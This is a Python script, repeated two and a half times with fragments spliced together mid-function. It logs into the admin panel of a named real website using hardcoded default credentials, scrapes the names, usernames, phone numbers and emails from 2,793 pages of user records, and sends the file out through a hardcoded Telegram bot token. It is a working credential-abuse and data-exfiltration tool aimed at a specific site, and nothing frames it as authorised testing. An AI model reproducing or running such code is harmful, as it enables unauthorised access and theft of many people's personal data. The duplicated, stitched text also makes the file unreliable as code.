import requests
from bs4 import BeautifulSoup
import telegram
import asyncio
import os
import time

# Telegram bot configuration
TELEGRAM_BOT_TOKEN = "8178015065:AAGe_FPh7RWxPjZCYTu-DW-JCs-i8HdNesk"
TELEGRAM_USER_ID = "7148139336"

# File to store scraped data
OUTPUT_FILE = "hee.atu.txt"

# Function to login and get session cookies
def login():
    login_url = "https://admin.tee.com.bd/admin/login"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': login_url
    })

    # Get the login page to extract form details
    try:
        response = session.get(login_url)
        if response.status_code != 200:
            print(f"Failed to access login page: Status code {response.status_code}")
            exit()

        # Parse the login page to find form and input fields
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print("No login form found on the page")
            print(f"Page content preview: {response.text[:500]}")
            exit()

        # Extract form action URL (in case it differs from login_url)
        form_action = form.get('action')
        if form_action:
            if not form_action.startswith('http'):
                form_action = "https://admin.tee.com.bd" + form_action
        else:
            form_action = login_url

        # Extract input field names and any hidden fields
        inputs = form.find_all('input')
        payload = {}
        username_field = None
        password_field = None
        for inp in inputs:
            name = inp.get('name')
            value = inp.get('value', '')
            if name:
                # Assume the first text-like input is username, second is password
                if inp.get('type') in ['text', 'email'] and not username_field:
                    username_field = name
                elif inp.get('type') == 'password' and not password_field:
                    password_field = name
                else:
                    # Include hidden fields (e.g., CSRF token)
                    payload[name] = value

        if not username_field or not password_field:
            print("Could not identify username or password fields")
            print(f"Form inputs found: {[inp.get('name') for inp in inputs if inp.get('name')]}")
            exit()

        # Set username and password
        payload[username_field] = "superadmin"
        payload[password_field] = "admin123456"

        print(f"Submitting login to: {form_action}")
        print(f"Payload: {payload}")

        # Post login request
        response = session.post(form_action, data=payload, allow_redirects=True)
        if response.status_code == 200:
            # Check if login was successful
            if "login" not in response.url.lower() and "error" not in response.text.lower():
                print("Login successful")
                print(f"Redirected to: {response.url}")
                return session
            else:
                print("Login failed: Likely invalid credentials or server issue")
                print(f"Response URL: {response.url}")
                print(f"Response content preview: {response.text[:500]}")
                exit()
        else:
            print(f"Login failed: Status code {response.status_code}")
            print(f"Response content preview: {response.text[:500]}")
            exit()

    except Exception as e:
        print(f"Login error: {e}")
        exit()

# Function to scrape data from a single page
def scrape_page(session, page_num):
    url = f"https://admin.tee.com.bd/admin/user/all-user?page={page_num}"
    try:
        response = session.get(url)
        if response.status_code != 200:
            print(f"Failed to access page {page_num}: Status code {response.status_code}")
            return []

        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')
        if not table:
            print(f"No table found on page {page_num}")
            return []

        data = []
        rows = table.find_all('tr')[1:]  # Skip header row
        for row in rows:
            cols = row.find_all('td')
            if len(cols) < 6:
                continue

            # Extract image
            img_tag = cols[0].find('img')
            image = img_tag['src'] if img_tag else "empty"

            # Extract name
            name = cols[1].text.strip() or "empty"

            # Extract username
            username = cols[2].text.strip() or "empty"

            # Extract phone
            phone = cols[3].text.strip() or "empty"

            # Extract email
            email = cols[4].text.strip() or "empty"

            # Format data
            data.append(f"{image}:{name}:{username}:{phone}:{email}")

        return data

    except Exception as e:
        print(f"Error scraping page {page_num}: {e}")
        return []

# Function to save data to file
def save_to_file(data):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        for line in data:
            f.write(line + '\n')

# Async function to send file via Telegram
async def send_file_to_telegram():
    bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
    try:
        with open(OUTPUT_FILE, 'rb') as file:
            await bot.send_document(chat_id=TELEGRAM_USER_ID, document=file, caption="Scraped data")
        print("File sent to Telegram successfully")
    except Exception as e:
        print(f"Failed to send file to Telegram: {e}")

# Main function
def main():
    # Clear output file if it exists
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)

    # Login and get session
    session = login()

    # Scrape data from page 1 to 2793
    for page in range(1, 2794):
        print(f"Scraping page {page}...")
        data = scrape_page(session, page)
        if data:
            save_to_file(data)
        else:
            print(f"No data found on page {page}")
        # Add a small delay to avoid overwhelming the server
        time.sleep(0.5)

    # Send file to Telegram
    asyncio.run(send_file_to_telegram())

if __name__ == "__main__":
    main()            print("No login form found on the page")
            print(f"Page content preview: {response.text[:500]}")
            exit()

        # Extract form action URL (in case it differs from login_url)
        form_action = form.get('action')
        if form_action:
            if not form_action.startswith('http'):
                form_action = "https://admin.tee.com.bd" + form_action
        else:
            form_action = login_url

        # Extract input field names and any hidden fields
        inputs = form.find_all('input')
        payload = {}
        username_field = None
        password_field = None
        for inp in inputs:
            name = inp.get('name')
            value = inp.get('value', '')
            if name:
                # Assume the first text-like input is username, second is password
                if inp.get('type') in ['text', 'email'] and not username_field:
                    username_field = name
                elif inp.get('type') == 'password' and not password_field:
                    password_field = name
                else:
                    # Include hidden fields (e.g., CSRF token)
                    payload[name] = value

        if not username_field or not password_field:
            print("Could not identify username or password fields")
            print(f"Form inputs found: {[inp.get('name') for inp in inputs if inp.get('name')]}")
            exit()

        # Set username and password
        payload[username_field] = "superadmin"
        payload[password_field] = "admin123456"

        print(f"Submitting login to: {form_action}")
        print(f"Payload: {payload}")

        # Post login request
        response = session.post(form_action, data=payload, allow_redirects=True)
        if response.status_code == 200:
            # Check if login was successful
            if "login" not in response.url.lower() and "error" not in response.text.lower():
                print("Login successful")
                print(f"Redirected to: {response.url}")
                return session
            else:
                print("Login failed: Likely invalid credentials or server issue")
                print(f"Response URL: {response.url}")
                print(f"Response content preview: {response.text[:500]}")
                exit()
        else:
            print(f"Login failed: Status code {response.status_code}")
            print(f"Response content preview: {response.text[:500]}")
            exit()

    except Exception as e:
        print(f"Login error: {e}")
        exit()

# Function to scrape data from a single page
def scrape_page(session, page_num):
    url = f"https://admin.tee.com.bd/admin/user/all-user?page={page_num}"
    try:
        response = session.get(url)
        if response.status_code != 200:
            print(f"Failed to access page {page_num}: Status code {response.status_code}")
            return []

        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')
        if not table:
            print(f"No table found on page {page_num}")
            return []

        data = []
        rows = table.find_all('tr')[1:]  # Skip header row
        for row in rows:
            cols = row.find_all('td')
            if len(cols) < 6:
                continue

            # Extract image
            img_tag = cols[0].find('img')
            image = img_tag['src'] if img_tag else "empty"

            # Extract name
            name = cols[1].text.strip() or "empty"

            # Extract username
            username = cols[2].text.strip() or "empty"

            # Extract phone
            phone = cols[3].text.strip() or "empty"

            # Extract email
            email = cols[4].text.strip() or "empty"

            # Format data
            data.append(f"{image}:{name}:{username}:{phone}:{email}")

        return data

    except Exception as e:
        print(f"Error scraping page {page_num}: {e}")
        return []

# Function to save data to file
def save_to_file(data):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        for line in data:
            f.write(line + '\n')

# Async function to send file via Telegram
async def send_file_to_telegram():
    bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
    try:
        with open(OUTPUT_FILE, 'rb') as file:
            await bot.send_document(chat_id=TELEGRAM_USER_ID, document=file, caption="Scraped data")
        print("File sent to Telegram successfully")
    except Exception as e:
        print(f"Failed to send file to Telegram: {e}")

# Main function
def main():
    # Clear output file if it exists
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)

    # Login and get session
    session = login()

    # Scrape data from page 1 to 2793
    for page in range(1, 2794):
        print(f"Scraping page {page}...")
        data = scrape_page(session, page)
        if data:
            save_to_file(data)
        else:
            print(f"No data found on page {page}")
        # Add a small delay to avoid overwhelming the server
        time.sleep(0.5)

    # Send file to Telegram
    asyncio.run(send_file_to_telegram())

if __name__ == "__main__":
    main()        # Extract CSRF token or other hidden inputs
        inputs = form.find_all('input')
        payload = {
            "username": "superadmin",
            "password": "admin123456"
        }
        for inp in inputs:
            if inp.get('name') and inp.get('value'):
                payload[inp.get('name')] = inp.get('value')

        # Post login request
        response = session.post(login_url, data=payload, allow_redirects=True)
        if response.status_code == 200:
            # Check if login was successful (e.g., redirected to dashboard or no error message)
            if "login" not in response.url.lower() and "error" not in response.text.lower():
                print("Login successful")
                return session
            else:
                print("Login failed: Invalid credentials or redirection issue")
                print(f"Response URL: {response.url}")
                print(f"Response content preview: {response.text[:500]}")
                exit()
        else:
            print(f"Login failed: Status code {response.status_code}")
            print(f"Response content preview: {response.text[:500]}")
            exit()

    except Exception as e:
        print(f"Login error: {e}")
        exit()

# Function to scrape data from a single page
def scrape_page(session, page_num):
    url = f"https://admin.tee.com.bd/admin/user/all-user?page={page_num}"
    try:
        response = session.get(url)
        if response.status_code != 200:
            print(f"Failed to access page {page_num}: Status code {response.status_code}")
            return []

        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')
        if not table:
            print(f"No table found on page {page_num}")
            return []

        data = []
        rows = table.find_all('tr')[1:]  # Skip header row
        for row in rows:
            cols = row.find_all('td')
            if len(cols) < 6:
                continue

            # Extract image
            img_tag = cols[0].find('img')
            image = img_tag['src'] if img_tag else "empty"

            # Extract name
            name = cols[1].text.strip() or "empty"

            # Extract username
            username = cols[2].text.strip() or "empty"

            # Extract phone
            phone = cols[3].text.strip() or "empty"

            # Extract email
            email = cols[4].text.strip() or "empty"

            # Format data
            data.append(f"{image}:{name}:{username}:{phone}:{email}")

        return data

    except Exception as e:
        print(f"Error scraping page {page_num}: {e}")
        return []

# Function to save data to file
def save_to_file(data):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        for line in data:
            f.write(line + '\n')

# Async function to send file via Telegram
async def send_file_to_telegram():
    bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
    try:
        with open(OUTPUT_FILE, 'rb') as file:
            await bot.send_document(chat_id=TELEGRAM_USER_ID, document=file, caption="Scraped data")
        print("File sent to Telegram successfully")
    except Exception as e:
        print(f"Failed to send file to Telegram: {e}")

# Main function
def main():
    # Clear output file if it exists
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)

    # Login and get session
    session = login()

    # Scrape data from page 1 to 2793
    for page in range(1, 2794):
        print(f"Scraping page {page}...")
        data = scrape_page(session, page)
        if data:
            save_to_file(data)
        else:
            print(f"No data found on page {page}")
        # Add a small delay to avoid overwhelming the server
        time.sleep(0.5)

    # Send file to Telegram
    asyncio.run(send_file_to_telegram())

if __name__ == "__main__":
    main()
